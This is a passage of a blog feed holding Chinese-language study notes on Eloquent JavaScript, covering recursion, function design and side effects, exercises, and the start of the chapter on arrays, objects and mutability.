<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">power</span>(<span class="params">base, exponent</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(exponent == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base * power(base, exponent - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(power(<span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// -&gt; 8</span></span><br></pre></td></tr></table></figure>
<p>这种递归的实现方法更贴近于数学对递归的定义，但是相对于循环版本，速度慢了三倍左右，运行一个简单的循环版本的代价要便宜得多。</p>
<p>速度和优雅需要做个折衷，一边是人类友好，一边是对机器友好。</p>
<p>power函数中，循环版本还算容易理解，没有必要去写一个递归版本。但有些程序为了看上去更加直观，只得放弃一些效率，换取书写的容易。</p>
<p>考虑效率可能让人分神，尤其是复杂的程序设计，再要额外考虑效率可能更让人崩溃。</p>
<p>因此，开始时先保证正确性，毕竟大量的代码并不会执行很多次。非要坚持效率的话，后期在做优化。</p>
<p>递归并不总是一种循环的低效率替代。有时候一些问题更容易用递归实现。经常地，这些问题需要探索或处理很多分支，而这些分支又会衍生出更多分支，比如图算法。</p>
<p>考虑这样的难题：从1开始，要么加5，要么乘3，给定一个数字，你怎么找到这样的序列可以产生这个数字呢？</p>
<p>比如，13可以被到达通过首先乘3，然后加两次5.15不可以被到达。</p>
<p>这是一个递归的实现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findSolution</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params">current, history</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current == target) &#123;</span><br><span class="line">      <span class="keyword">return</span> history;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(current &gt; target) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> find(current + <span class="number">5</span>, <span class="string">`(<span class="subst">$&#123;history&#125;</span> + 5)`</span>) || find(current * <span class="number">3</span>, <span class="string">`(<span class="subst">$&#123;history&#125;</span> * 3)`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> find(<span class="number">1</span>, <span class="string">"1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(findSolution(<span class="number">24</span>));</span><br><span class="line"><span class="comment">// -&gt; (((1 * 3) + 5) * 3)</span></span><br></pre></td></tr></table></figure>

<p>这个程序并不会找到最短的操作序列，只是在找到一个满足条件的序列就会停止。</p>
<p>内部的find函数做了递归操作，若当前current等于目标target，则返回history，若当前current大于目标target，则这个分支不存在，返回null，否则小于target，我们通过递归做尝试，可以加5，可以乘以3.如果第一个没有返回null，则返回第一个表达式返回的内容，否则返回第二个表达式返回的内容。不考虑是一个字符串还是null（或运算符的短路效应）。</p>
<p>为了更好理解函数的调用过程，我们拿13举个例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find(1, &quot;1&quot;)</span><br><span class="line">  find(6, &quot;(1 + 5)&quot;)</span><br><span class="line">    find(11, &quot;((1 + 5) + 5)&quot;)</span><br><span class="line">      find(16, &quot;(((1 + 5) + 5) + 5)&quot;)</span><br><span class="line">        too big</span><br><span class="line">      find(33, &quot;(((1 + 5) + 5) * 3)&quot;)</span><br><span class="line">        too big</span><br><span class="line">    find(18, &quot;((1 + 5) * 3)&quot;)</span><br><span class="line">      too big</span><br><span class="line">  find(3, &quot;(1 * 3)&quot;)</span><br><span class="line">    find(8, &quot;((1 * 3) + 5)&quot;)</span><br><span class="line">      find(13, &quot;(((1 * 3) + 5) + 5)&quot;)</span><br><span class="line">        found!</span><br></pre></td></tr></table></figure>
<p>缩进表明了调用栈的深度，第一次find被调用的时候，首先尝试1+5，然后继续向更深层次的递归，直到current大于或者等于target，到最后在这条分支上发现行不通，于是开始尝试乘3的分支，直到遇见一个满足条件的返回值，并且由于逻辑或的特性，就开始一层层向上返回而不再继续后续的计算。</p>
<h2 id="生长的函数"><a href="#生长的函数" class="headerlink" title="生长的函数"></a>生长的函数</h2><p>有两种自然方式去在你的程序中引入函数：一种是你发现多次写了相似的代码，这样的情况下，更容易引进错误，并且可读性不好。还有一种情况是你需要某种功能，你觉得它值得被包装为一个函数，你将开始于命名这个函数，然后书写它的函数体。你甚至还可能在写这个函数之前已经书写了它的用例函数。</p>
<p>给函数一个好名字的困难性取决于你想包装的这个概念有多清晰明了，举个例子：</p>
<p>我们想要打印农场牛和鸡的数量，零填充动物的数量，后面加上Cows和Chickens。如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">007 Cows</span><br><span class="line">011 Chickens</span><br></pre></td></tr></table></figure>

<p>这需要两个参数，分别是牛的数量还有鸡的数量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printFarmInventory</span>(<span class="params">cows, chickens</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cowString = <span class="built_in">String</span>(cows);</span><br><span class="line">  <span class="keyword">while</span> (cowString.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    cowString = <span class="string">"0"</span> + cowString;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;cowString&#125;</span> Cows`</span>);</span><br><span class="line">  <span class="keyword">let</span> chickenString = <span class="built_in">String</span>(chickens);</span><br><span class="line">  <span class="keyword">while</span> (chickenString.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    chickenString = <span class="string">"0"</span> + chickenString;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;chickenString&#125;</span> Chickens`</span>);</span><br><span class="line">&#125;</span><br><span class="line">printFarmInventory(<span class="number">7</span>, <span class="number">11</span>);</span><br></pre></td></tr></table></figure>

<p>字符串的length属性返回字符串的长度。因此，while循环会在数字字符串加前导0直到他们至少三个字符长。</p>
<p>就当我们马上要交付程序的时候，农民告诉我们还想要打印猪的数量，于是我们重新思考，与其复制粘贴重复的代码，是不是还有更好的方案呢？这是第一种尝试：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printZeroPaddedWithLabel</span>(<span class="params">number, label</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> numberString = <span class="built_in">String</span>(number);</span><br><span class="line">  <span class="keyword">while</span> (numberString.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    numberString = <span class="string">"0"</span> + numberString;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;numberString&#125;</span> <span class="subst">$&#123;label&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printFarmInventory</span>(<span class="params">cows, chickens, pigs</span>) </span>&#123;</span><br><span class="line">  printZeroPaddedWithLabel(cows, <span class="string">"Cows"</span>);</span><br><span class="line">  printZeroPaddedWithLabel(chickens, <span class="string">"Chickens"</span>);</span><br><span class="line">  printZeroPaddedWithLabel(pigs, <span class="string">"Pigs"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printFarmInventory(<span class="number">7</span>, <span class="number">11</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>这没有问题！但是这个函数名多少有点尴尬。它将打印，零填充以及添加标签三种事情放到一个函数中。</p>
<p>代替把我们程序中大规模的重复部分抽到一个函数中，我们尝试着去用单个concept（概念）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zeroPad</span>(<span class="params">number, width</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> string = <span class="built_in">String</span>(number);</span><br><span class="line">  <span class="keyword">while</span>(string.length &lt; width) &#123;</span><br><span class="line">    string = <span class="string">"0"</span> + string;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printFarmInventory</span>(<span class="params">cows, chickens, pigs</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;zeroPad(cows, <span class="number">3</span>)&#125;</span> Cows`</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;zeroPad(chickens, <span class="number">3</span>)&#125;</span> Chickens`</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;zeroPad(pigs, <span class="number">3</span>)&#125;</span> Pigs`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拥有一个显而易见的函数名字使得读代码的人很容易的明白它的作用，这个函数不仅在这样的上下文中是有用的，但很多其他场合如打印对齐的数字表格都很有用。</p>
<p>一个书写函数的实用原则是除非你很确定要添加一些小聪明在里面，否则不要添加。可能将你遇到大的每一块功能都写一个通用框架是很吸引人的，要抵制这个强烈的欲望，你将不会完成任何实际的工作，只是会写一堆永远都用不到的代码。</p>
<h2 id="函数和副作用"><a href="#函数和副作用" class="headerlink" title="函数和副作用"></a>函数和副作用</h2><p>函数可大致分为产生副作用的函数和产生返回值的函数。</p>
<p>第一个printZeroPaddedWithLabel因为其副作用就是打印一行文本被调用，而第二个zeroPad则是因为其返回值被调用。无疑第二种在很多情况下比第一种有用。创造返回值的函数更容易用新的方式去组合相对于直接表现副作用的函数。</p>
<p>一个纯函数（pure function）是一种特定的生成返回值的函数，不仅没有副作用也不依赖于其他代码的副作用。比如，不读取可能会变化的全局变量。一个纯函数值要用相同的参数调用，就会返回相同的值。</p>
<p>没有必要感觉到悲伤去写一个非纯函数，副作用经常也是很有用的，比如console.log。用副作用，一些操作更容易以一种高效的方式去表达，所以计算速度可以是避免纯函数的一个原因。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一章讲述如何写自己的函数。function关键字作为表达式被使用的时候，可以创造一个函数值。被用作语句的时候，可以声明一个绑定，并且给定一个函数作为他的值。箭头函数也可以创造函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Define f to hold a function value</span></span><br><span class="line"><span class="keyword">const</span> f = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a + <span class="number">2</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare g to be a function</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a * b * <span class="number">3.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A less verbose function value</span></span><br><span class="line"><span class="keyword">let</span> h = <span class="function"><span class="params">a</span> =&gt;</span> a % <span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<p>理解函数一个关键的方面是理解作用域。每一个块创造一个新的作用域。声明在一个块里的参数和绑定是局部可见的。用var声明的绑定表现得不太一样，他们终止于最近的函数作用域或是全局作用域，也就是说，var不受限于块级作用域。</p>
<p>将你的程序要完成的任务分离为不同的函数是很有帮助的。你不会重复太多代码，并且函数也帮助组织代码，从而让不同的部分做特定的事情。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="最小"><a href="#最小" class="headerlink" title="最小"></a>最小</h3><p>写一个类似Math.min一样的函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params">i1, i2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(i1 &gt; i2) <span class="keyword">return</span> i2;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> i1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h3><p>写一个isEven函数，判断偶性，但是按照递归的方式写，0是偶数，1是奇数，对于其他数字，奇偶性等同自己减2的数字。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEven</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(num &lt; <span class="number">0</span>) <span class="keyword">return</span> isEven(-num);</span><br><span class="line">  <span class="keyword">if</span>(num == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> isEven(num - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修复num为负的情况，若num为负，返回它的相反数的偶性。</p>
<h3 id="豆子计数"><a href="#豆子计数" class="headerlink" title="豆子计数"></a>豆子计数</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(countBs(<span class="string">"BBC"</span>));</span><br><span class="line"><span class="comment">// → 2</span></span><br><span class="line"><span class="built_in">console</span>.log(countChar(<span class="string">"kakkerlak"</span>, <span class="string">"k"</span>));</span><br><span class="line"><span class="comment">// → 4</span></span><br></pre></td></tr></table></figure>
<p>上面的是用例函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countBs</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(str[i] == <span class="string">"B"</span>) count++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countChar</span>(<span class="params">str, character</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(str[i] == character) count++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">countBs</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> countChar(str, <span class="string">"B"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>EJ4</title>
    <url>/2018/12/21/EJ4/</url>
    <content><![CDATA[<h1 id="数据结构：对象和数组"><a href="#数据结构：对象和数组" class="headerlink" title="数据结构：对象和数组"></a>数据结构：对象和数组</h1><p>数字，布尔值和字符串类型是数据结构构建的原子。许多类型的数据需要很多的原子类型的数据来组成。对象就允许我们将值组合在一起，还可以包含其他对象来构建复杂的结构。</p>
<p>到目前为止的程序只是操作的简单数据，这一章将会介绍一些基本数据结构。结束的时候，将会知道足够多的知识开始写一些有用的程序。</p>
<p>这一章将会解决现实中编程的例子，引入一些概念。例子代码构建在函数和变量基础上。</p>
<a id="more"></a>
<h2 id="松鼠"><a href="#松鼠" class="headerlink" title="松鼠"></a>松鼠</h2><p>下午8点到10点，雅克发现自己变型为毛茸茸的啮齿动物，带着很多毛的尾巴。（松鼠）。</p>
<p>没有变成狼减少了很多麻烦。不是担心吃掉邻居，它担心被邻居家的小猫吃掉。不规律的变形使得雅克怀疑这可能是什么事情触发的。雅克一度认为，可能和它靠近橡树有关，但是避免橡树并不能解决问题。</p>
<p>所以雅克每天记录日志，以及是否触发变形，希望能找到原因。</p>
<p>他要做的第一件事就是用一种数据结构去存储这个信息。</p>
<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>为了用一堆数字，我们首先不得不找到一种在内存中表示的方式。比方说，我们想要表示一个2，3，5，7，11的数字集合。</p>
<p>我们可以用字符串，但是很麻烦，为了获取他们，你还得提取他们，并转换成数字类型。</p>
<p>幸运的是，JS提供了一种存储值序列的数据类型。叫做数组，并且以列表的形式写在中括号中间，被逗号分隔。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> listOfNumbers = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>];</span><br><span class="line"><span class="built_in">console</span>.log(listOfNumbers[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// → 5</span></span><br><span class="line"><span class="built_in">console</span>.log(listOfNumbers[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// → 2</span></span><br><span class="line"><span class="built_in">console</span>.log(listOfNumbers[<span class="number">2</span> - <span class="number">1</span>]);</span><br><span class="line"><span class="comment">// → 3</span></span><br></pre></td></tr></table></figure>
<p>获取数组中的元素同样采用中括号标记。</p>
<p>数组下标以0开始，把下标想象成skip的数组元素数量。</p>
<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>我们看过一些额类似myString.length和Math.max一样的表达式。这些是获取某个值的属性的表达式。第一种情况，我们获取myString值中的length属性，第二种情况下，我们获取Math对象中的max属性（Math对象是一个数学相关的常量和函数的集合）</p>
<p>差不多所有的JS值都有属性，除了null和underfined。如果尝试在这些空值上获取属性，你将会得到一个错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="literal">null</span>.length;</span><br><span class="line"><span class="comment">// -&gt; TypeError: null has no properties</span></span><br></pre></td></tr></table></figure>

<p>两种主要的获取属性的方式是点标记和中括号标记。value.x和value[x]都可以获取value上的x属性，但是不一定是同一个属性。区别在于x是怎么被解释的。当用一个点标记的时候，点后面的单词是属性的字面量的名字。当用一个中括号标记的时候，中括号中间的表达式会被求值（evaluate），为了得到属性的名字。所以value.x获取value名为”x”的属性，而value[x]将x表达式计算求值后转为字符串作为要获取的属性名。</p>
<p>所以如果知道感兴趣的属性叫做color，你可以用value.color。如果想从一个绑定i中提取一个属性名，你可以使用value[i]。属性名是字符串。他们可以是任何字符串，但是点标记只对那些看起来是合法的变量名的属性才有效。如果你想要获取属性名为2或者像John Doe这样的属性名，就必须使用中括号了，也就是value[2]或者value[“John Doe”]。</p>
<p>数组中的元素是以数组的属性存储的，并用数字作为属性名。因为你不能用点表示法获取数字，而且通常想用一个变量保存数组的索引，你不得不用中括号去获取数组元素。</p>
<p>数组的length属性告诉我们数组中元素的个数，这个属性名是一个合法的变量名，并且我们预先知道这个属性名。所以为了获取数组长度，我们用array.length，而不是array[“length”]，因为前者书写更简单。</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>除了length属性，字符串和数组还包含一些存储着函数值的属性：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> doh = <span class="string">"Doh"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> doh.toUpperCase);</span><br><span class="line"><span class="comment">// → function</span></span><br><span class="line"><span class="built_in">console</span>.log(doh.toUpperCase());</span><br><span class="line"><span class="comment">// → DOH</span></span><br></pre></td></tr></table></figure>

<p>每个字符串都有一个toUpperCase属性。被调用的时候，将会返回一个字符串副本，副本里面所有的字母都被转换为大写形式。还有一个toLowerCase，表现为相反的情况。</p>
<p>有趣的是，即使toUpperCase没有传递任何参数，这个函数也用了某种方法获取到了字符串”Doh”，我们调用了该值的属性。这个是如何工作的将在第六章描述。</p>
<p>包含函数的属性通常被叫做他们所属值的方法（methods），toUpperCase是字符串的方法。</p>
<p>这个例子展示了两个可用于修改数组的方法。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sequence = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">sequence.push(<span class="number">4</span>);</span><br><span class="line">sequence.push(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sequence);</span><br><span class="line"><span class="comment">// → [1, 2, 3, 4, 5]</span></span><br><span class="line"><span class="built_in">console</span>.log(sequence.pop());</span><br><span class="line"><span class="comment">// → 5</span></span><br><span class="line"><span class="built_in">console</span>.log(sequence);</span><br><span class="line"><span class="comment">// → [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>
<p>push方法在数组末尾加个值，pop移除值并返回被移除的值。</p>
<p>这些有点愚蠢的名字是栈的操作的传统术语。栈是一种数据结构，允许你push值到栈中，pop最后添加的值，后进先出的数据结构。前面的函数调用栈就是这个主意的一个实例。</p>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>回到松鼠的问题，一组日志条目可以被表示为数组。但是条目不仅仅包含数字和字符串，每一个条目还需要存储一个活动列表和一个布尔值去表明是否产生了变身。理想情况下，我们可以将这些打包在一个值里面并且将这些打包好的值放在一个日志条目数组中。</p>
<p>对象类型的值是任意属性的集合。一种创造对象的方式就是用花括号表达式创建。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> day1 = &#123;</span><br><span class="line">  squirrel: <span class="literal">false</span>,</span><br><span class="line">  events: [<span class="string">"work"</span>, <span class="string">"touched tree"</span>, <span class="string">"pizza"</span>, <span class="string">"running"</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(day1.squirrel);</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"><span class="built_in">console</span>.log(day1.wolf);</span><br><span class="line"><span class="comment">// → undefined</span></span><br><span class="line">day1.wolf = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">console</span>.log(day1.wolf);</span><br><span class="line"><span class="comment">// → false</span></span><br></pre></td></tr></table></figure>
<p>在括号里面，有一个以逗号分隔的属性列表，每个属性有一个名字以及一个冒号，后面跟着属性的值。当一个对象跨越多行的时候，像例子中的缩进使得可读性更好。属性名不是合法的变量名或是数字必须用引号引起来。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> descriptions = &#123;</span><br><span class="line">    work: <span class="string">"Went to work"</span>,</span><br><span class="line">    <span class="string">"touched tree"</span>L <span class="string">"Touched a tree"</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这意味着括号有两种意义，在语句的开始，他们表明一个块的开始，在其他位置，他们描述一个对象。幸运的是，很少用大括号包裹的对象开始一个语句，所以歧义性不是个问题。</p>
<p>读取一个不存在的属性会返回underfined。</p>
<p>可以用<code>=</code>来给对象的属性赋值，如果属性存在就覆盖，否则创建新的键值对。</p>
<p>简要回忆下绑定的触手模型。属性绑定也是相似的。他们grasp值，但是其他的绑定和属性也可能保存着那些相同的值。你可以把对象想象成有任意数量的触角，每一个都有一个名字刺在触角上。</p>
<p><code>delete</code>操作符会从章鱼身上切断一个触角。他是一个一元操作符，当被应用到对象的属性时，会从对象上移除那个名字的属性。这不是很常用，但是可以实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> anObject = &#123;<span class="attr">left</span>: <span class="number">1</span>, <span class="attr">right</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(anObject.left);</span><br><span class="line"><span class="comment">// → 1</span></span><br><span class="line"><span class="keyword">delete</span> anObject.left;</span><br><span class="line"><span class="built_in">console</span>.log(anObject.left);</span><br><span class="line"><span class="comment">// → undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"left"</span> <span class="keyword">in</span> anObject);</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"right"</span> <span class="keyword">in</span> anObject);</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>
<p>二元操作符<code>in</code>，当给定一个字符串和对象时，将会告诉你是否那个对象有一个特定名字（字符串指定）的属性。将一个对象属性显式设置为underfined和将一个对象的属性删除的区别在于，前者对象仍然拥有那个属性（只是属性并没有一个太有意义的值），然而后者属性不复存在，并且<code>in</code>操作符的结果会返回<code>false</code>。</p>
<p>为了获取对象属性，可以用<code>Object.keys</code>函数，这个函数返回一个以对象键作为值的字符串数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>,keys(&#123;<span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span>, <span class="attr">z</span>: <span class="number">2</span>&#125;));</span><br><span class="line"><span class="comment">// -&gt; ["x", "y", "z"]</span></span><br></pre></td></tr></table></figure>
<p>还有一个<code>Object.assign</code>函数从一个对象拷贝所有的属性到另一个对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> objectA = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">Object</span>.assign(objectA, &#123;<span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">4</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(objectA);</span><br><span class="line"><span class="comment">// -&gt; &#123;a: 1, b: 3, c: 4&#125;</span></span><br></pre></td></tr></table></figure>

<p>数组只不过是一种特定的存储一个序列的东西的对象。如果执行<code>typeof []</code>，将会返回”object”。</p>
<p>我们把雅克的日记记作一个对象数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> journal = [</span><br><span class="line">  &#123;<span class="attr">events</span>: [<span class="string">"work"</span>, <span class="string">"touched tree"</span>, <span class="string">"pizza"</span>,</span><br><span class="line">            <span class="string">"running"</span>, <span class="string">"television"</span>],</span><br><span class="line">   squirrel: <span class="literal">false</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">events</span>: [<span class="string">"work"</span>, <span class="string">"ice cream"</span>, <span class="string">"cauliflower"</span>,</span><br><span class="line">            <span class="string">"lasagna"</span>, <span class="string">"touched tree"</span>, <span class="string">"brushed teeth"</span>],</span><br><span class="line">   squirrel: <span class="literal">false</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">events</span>: [<span class="string">"weekend"</span>, <span class="string">"cycling"</span>, <span class="string">"break"</span>, <span class="string">"peanuts"</span>,</span><br><span class="line">            <span class="string">"beer"</span>],</span><br><span class="line">   squirrel: <span class="literal">true</span>&#125;,</span><br><span class="line">  <span class="comment">/* and so on... */</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<h2 id="可变性"><a href="#可变性" class="headerlink" title="可变性"></a>可变性</h2><p>我们很快进入正式的编程了。首先有一点理论知识需要理解。</p>
<p>我们已经知道对象的值是可以改变的。但是早先学习的数字，字符串和布尔值都是不可变的（immutable），也就是不能去改变这些类型的值。</p>
<p>对象以另外的方式去工作。你可以改变对象的属性值，使得同一个对象在不同的时间有着不同的内容。</p>
<p>当我们有两个数字，120和120，我们可以把他们呢看作是相同的数字，不管他们是不是指向同样的物理位。对象的情况有不太一样。有两个引用指向同一个对象和包含相同的属性的不同对象，有着本质的差异。考虑如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> object1 = &#123;<span class="attr">value</span>: <span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> object2 = object1;</span><br><span class="line"><span class="keyword">let</span> object3 = &#123;<span class="attr">value</span>: <span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(object1 == object2);</span><br><span class="line"><span class="comment">// → true</span></span><br><span class="line"><span class="built_in">console</span>.log(object1 == object3);</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"></span><br><span class="line">object1.value = <span class="number">15</span>;</span><br><span class="line"><span class="built_in">console</span>.log(object2.value);</span><br><span class="line"><span class="comment">// → 15</span></span><br><span class="line"><span class="built_in">console</span>.log(object3.value);</span><br><span class="line"><span class="comment">// → 10</span></span><br></pre></td></tr></table></figure>
<p><code>object1</code>和<code>object2</code>绑定引用的是同一个对象，那也是改变<code>object1</code>的属性值也会改变<code>object2</code>属性值的原因。<code>object3</code>只是恰巧和<code>object1</code>初始包含同样的内容，但完全不是一码事。</p>
<p>绑定也是可变的或者是恒定的，但是和他们的值的表现行为无关。即使一个数字类型的值不可变，你可以用一个<code>let</code>绑定去追踪一个改变的数字通过改变绑定指向的值。相似地，即便通过一个<code>const</code>绑定的指向的对象不会改变，但对象的内容可能会改变。</p>
